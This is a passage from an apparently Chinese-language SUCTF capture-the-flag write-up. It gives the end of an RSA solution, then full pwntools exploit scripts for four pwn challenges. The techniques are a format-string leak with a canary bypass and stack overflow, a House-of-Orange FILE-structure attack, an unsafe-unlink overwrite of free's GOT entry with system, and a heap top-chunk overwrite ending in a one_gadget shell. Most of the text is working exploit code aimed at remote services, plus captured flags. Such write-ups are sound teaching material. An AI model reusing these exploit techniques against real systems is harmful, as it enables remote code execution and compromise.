c = Exgcd(s,n) * test[1][0]

m = pow(c, d, n)
print str(hex(m))[2:-1].decode('hex')

#SUCTF{Ju5t_hav3_fun_emmm}
```

## good rsa

n可分解为 7 * 大数，直接得d，进而得明文
代码当时直接用的cmd。。懒得写了2333

# pwn

## lock2

根据提示暴力跑出六位密码为`123456`

输入的cmd存在格式化漏洞，不限次数，但是输入长度仅为32个字节，但对于能够无限次利用已经足够。接下来就是利用格式化dump代码段，解锁黑盒后可以触发栈溢出，之后就是触发Pandora函数，获得flag

最终代码如下：
```python
#!/usr/bin/env python
# coding=utf-8

from pwn import *
import itertools
import string
import os

def pwn(offset):
    # context.log_level = 'DEBUG'
    p = remote('pwn.suctf.asuri.org', 20001)

    p.recvuntil('password')
    p.sendline('123456')

    def leak_format(start, length):
        out = ''
        for i in range(start, start + length):
            out += '-%%%d$p' % i
        return out

    # for i in range(20):
    #     p.recvuntil('cmd:')
    #     format_string = leak_format(2 + 4*i, 4)
    #     p.sendline(format_string)
    #     print p.recvline()
    def run_cmd(p, cmd):
        p.recvuntil('cmd:')
        p.sendline(cmd)

    def leak_stack(p, index):
        p.recvuntil('cmd:')
        p.sendline("%%%d$pAAA" % index)
        p.recvuntil('cmd:')
        return int(p.recvuntil('AAA', drop=True), 16)

    def leak_mem(p, addr):
        buf = '%7$s' + '=--=' + p64(addr) + 'bb' 
        run_cmd(p, buf)
        p.recvuntil('cmd:')
        return p.recvuntil('=--=', drop=True)

    def write_mem(p, addr, value):
        if value != 0:
            buf = ('%%%dc%%7$hn' % value).ljust(8, '=') + p64(addr) + 'bb' 
        else:
            buf = '%%7$hn'.ljust(8, '=') + p64(addr) + 'bb' 

        run_cmd(p, buf)
        p.recvuntil('cmd:')


    def get_codebase(p):
        code_base = leak_stack(p, 16) & (~0xfff)
        
        while True:
            print hex(code_base)
            data = leak_mem(p, code_base)
            if 'ELF' in data:
                print data
                break
            else:
                code_base -= 0x1000
                
        print 'code_base is ' + hex(code_base)
        return code_base

    def dumpmem(offset, length):
        p = remote('pwn.suctf.asuri.org', 20001)
        p.recvuntil('password')
        p.sendline('123456')
        
        code_base = get_codebase(p)

        dump = ''
        addr = code_base + offset
        count = 0

        while len(dump) < length:
            count += 1
            if '\x0a' in p64(addr):
                print 'bad addr', hex(addr)
                addr += 1
                dump += '\x00'
        
            data = leak_mem(p, addr)
            data += '\x00'
            dump += data
            addr += len(data)
            
            print hex(addr)
            if count % 200 == 0:
                print dump.encode('hex')

        p.close()
        return dump

    def dumpelf():
        for i in range(12):
            dumpfile = 'dump%02d' % i
            if os.path.exists(dumpfile):
                print 'dumpfile %s exists' % dumpfile
                continue

            size = 0x400
            dump = dumpmem(i*size, size)[:size]

            print 'dump length is ', len(dump)
            open(dumpfile, 'wb').write(dump)

    # dumpelf()
    # for i in range(2, 20):
    #     try:
    #         print i, hex(leak_stack(i))
    #     except Exception as e:
    #         print e

    canary = leak_stack(p, 15)
    print 'canary is ', hex(canary)


    p.recvuntil('K  ')
    addr = int(p.recvuntil('--', drop=True), 16)
    def write_byte(byte):
        for i in range(8):
            if byte >> i == 0:
                break
            bit = (byte >> i) & 1
            write_mem(p, addr + i*4, bit)
        
    # for i in range(34, 256):
    #     print i
    #     write_byte(i)    
    #     print p.recvline_contains('lock')

    write_byte(35)
    p.recvuntil('Box:')
    func_flag = int(p.recvline().strip('\n'), 16)
    print 'func_addr is ', hex(func_flag)
    p.recvuntil('name:')
    p.sendline('aaaaaaaaaa')
    # p.sendline('a'*offset +  p64(canary) + p64(func_addr))
    p.recvuntil('want?')
    p.sendline('b'*0x1A + p64(canary)*2 + p64(func_flag)*10)
    p.interactive()

for i in range(1):
    pwn(i)
```
## note
```python
from pwn import *

#SUCTF{Me1z1jiu_say_s0rry_LOL}
context.log_level='debug'
debug=0
if debug:
	p = process('./note')
	libc=ELF('./libc.so')
else :
	libc = ELF('./libc6_2.24-12ubuntu1_amd64.so')
	p = remote('pwn.suctf.asuri.org',20003)


def add(size,content):
	p.recvuntil('Choice>>')
	p.sendline('1')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.sendline(content)
def show(index):
	p.recvuntil('Choice>>')
	p.sendline('2')
	p.recvuntil('Index:')
	p.sendline(str(index))
def dele():
	p.recvuntil('Choice>>')
	p.sendline('3')
	p.recvuntil('(yes:1)')
	p.sendline('1')

#p.recvuntil('Welcome Homura Note Book!   ')
add(16,'1'*16)#2

#leak system address
dele()
show(0)
p.recvuntil('Content:')
libc_addr = u64(p.recv(6)+'\x00\x00')
offset =  0x7f1b15e2ab78-0x7f1b15a66000
libc_base = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']
sys_addr = libc_base+libc.symbols['system']
malloc_hook = libc_base+libc.symbols['__malloc_hook']
io_list_all = libc_base+libc.symbols['_IO_list_all']
binsh_addr = libc_base+next(libc.search('/bin/sh'))
log.info('sys_addr:%#x' %sys_addr)

#fake chunk
fake_chunk = p64(0x8002)+p64(0x61) #header
fake_chunk += p64(0xddaa)+p64(io_list_all-0x10)
fake_chunk += p64(0x2)+p64(0xffffffffffffff) + p64(0)*2 +p64((binsh_addr-0x64)/2)
fake_chunk = fake_chunk.ljust(0xa0,'\x00')
fake_chunk += p64(sys_addr+0x420)
fake_chunk = fake_chunk.ljust(0xc0,'\x00')
fake_chunk += p64(0)

vtable_addr = malloc_hook-13872#+libc.symbols['_IO_str_jumps']
payload = 'a'*16 +fake_chunk
payload += p64(0)
payload += p64(0)
payload += p64(vtable_addr)
payload += p64(sys_addr)
payload += p64(2)
payload += p64(3) 
payload += p64(0)*3 # vtable
payload += p64(sys_addr)
add(16,payload)#3
#gdb.attach(p)
p.recvuntil('Choice>>')
p.sendline('1')
p.recvuntil('Size:')
p.sendline(str(0x200))

p.interactive()
```
## heap
```python
from pwn import *
context.log_level='debug'
debug = 0

free_got=0x602018
ptr=0x6020c0
if debug:
	p = process('./offbyone')
	libc = ELF('./libc.so')
else:
	p= remote('pwn.suctf.asuri.org',20004)
	libc = ELF('./libc-2.23.so')

def add(size,data):
	p.recvuntil('4:edit\n')
	p.sendline('1')
	p.recvuntil('input len\n')
	p.sendline(str(size))
	p.recvuntil('input your data\n')
	p.send(data)
def dele(index):
	p.recvuntil('4:edit\n')
	p.sendline('2')
	p.recvuntil('input id\n')
	p.send(str(index))
def show(index):
	p.recvuntil('4:edit\n')
	p.sendline('3')
	p.recvuntil('input id\n')
	p.send(str(index))
def edit(index,data):
	p.recvuntil('4:edit\n')
	p.sendline('4')
	p.recvuntil('input id\n')
	p.sendline(str(index))
	p.recvuntil('input your data\n')
	p.send(data)	

add(136,'hack by 0gur1'.ljust(136,'a'))#0
add(128,'hack by 0gur2'.ljust(128,'b'))#1
add(128,'/bin/sh')#2
add(128,'/bin/sh')#3
add(128,'hack by 0gur1'.ljust(128,'d'))#4
add(136,'hack by 0gur1'.ljust(136,'e'))#5
add(128,'hack by 0gur1'.ljust(128,'f'))#6
add(128,'hack by 0gur1'.ljust(128,'g'))#7


fake_chunk = 'a'*8+p64(0x81) +p64(ptr+40-24)+p64(ptr+40-16)
payload= fake_chunk
payload= payload.ljust(0x80,'a')
payload+=p64(0x80)
payload+='\x90'


edit(5,payload)

dele(6)

edit(5,'\x18\x20\x60')
#gdb.attach(p)
show(2)
free_addr = u64(p.recv(6)+'\x00\x00')
sys_addr = free_addr-(libc.symbols['free']-libc.symbols['system'])
log.info('sys_addr:%#x' %sys_addr)
#gdb.attach(p)
edit(2,p64(sys_addr))
dele(3)

p.interactive()

```

## noend
```python
from pwn import *
import time
context.log_level = 'debug'

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./noend', env={"LD_PRELOAD":"./libc.so.6"})
		# gdb.attach(p, '\nc')
	else:
		p = remote(ip, port)
	time_out = 1
	for i in range(1, 3):
		p.sendline(str(i * 0x10))
		time.sleep(time_out)
		p.send('w1tcher')
		p.recvn(i * 0x10 + 1)

	p.sendline(str(8 * 0x10))
	time.sleep(time_out)
	p.send('w1tcher')
	p.recvn(8 * 0x10 + 1)

	# for i in range(3, 7):
	p.sendline(str(4 * 0x10))
	time.sleep(time_out)
	p.send('w1tcher')
	p.recvn(4 * 0x10 + 1)

	p.sendline(str(8 * 0x10))
	time.sleep(time_out)
	p.send('w1tcher')
	p.recvn(8 * 0x10 + 1)

	p.sendline(str(0x400))
	time.sleep(time_out)
	p.send('\x00' * 0x338 + p64(0xfffffffffffffff1))
	p.recvn(0x400 + 1)

	p.sendline(str(0x10))
	time.sleep(time_out)
	p.send('\x00' * 0x8)
	heap_base = u64(p.recvn(0x10 + 1)[0x8 : 0x10]) - 0xe0
	log.info('heap base is : ' + hex(heap_base))

	p.sendline(str(0x20))
	time.sleep(time_out)
	p.send('\x00' * 0x8)
	libc_base = u64(p.recvn(0x20 + 1)[0x8 : 0x10]) - 0x3c1b58
	log.info('libc base is : ' + hex(libc_base))

	p.sendline(str(libc_base + 0x3c1b58))
	time.sleep(time_out)
	p.send('\x00')
	p.recvn(2)

	p.sendline(str(0x78))
	time.sleep(time_out)
	p.send('\x00')
	p.recvn(0x78 + 1)

	p.sendline(str(0x80))
	time.sleep(time_out)
	p.send('\x00')
	p.recvn(0x80 + 1)

	p.sendline(str(0x400))
	time.sleep(time_out)
	p.send('\x00' * 0x318 + p64(0xfffffffffffffff1))
	p.recvn(0x400 + 1)

	p.sendline(str(0x78))
	time.sleep(time_out)
	p.send('\x00')
	non_heap_base = u64(p.recvn(0x78 + 1)[8 : 0x10]) - 0x108
	log.info('non heap base is : ' + hex(non_heap_base))

	p.sendline(str(non_heap_base + 0x78 + 1))
	time.sleep(time_out)
	p.send('\x00')
	p.recvn(2)

	p.sendline(str(- 0xd00))
	time.sleep(time_out)
	for i in range(15):
		p.recvn(0x1000)

	p.sendline(str(0xa00))
	time.sleep(time_out)
	p.send(p64(0x0000000300000000) + p64(0) * 5 + p64(libc_base + 0x3c1af0 - 0x23))
	time.sleep(time_out)


	p.sendline(str(0x60))
	time.sleep(time_out)
	one_gadget = 0xf2519
	one_gadget = 0xf1691
	# one_gadget = 0x455aa
	p.send('\x00' * 3 + p64(libc_base + 0x886e0) + p64(libc_base + 0x882c0) + p64(libc_base + one_gadget))
	time.sleep(time_out)


	p.interactive()

if __name__ == '__main__':
	GameStart('pwn.suctf.asuri.org', 20002, 0)
```
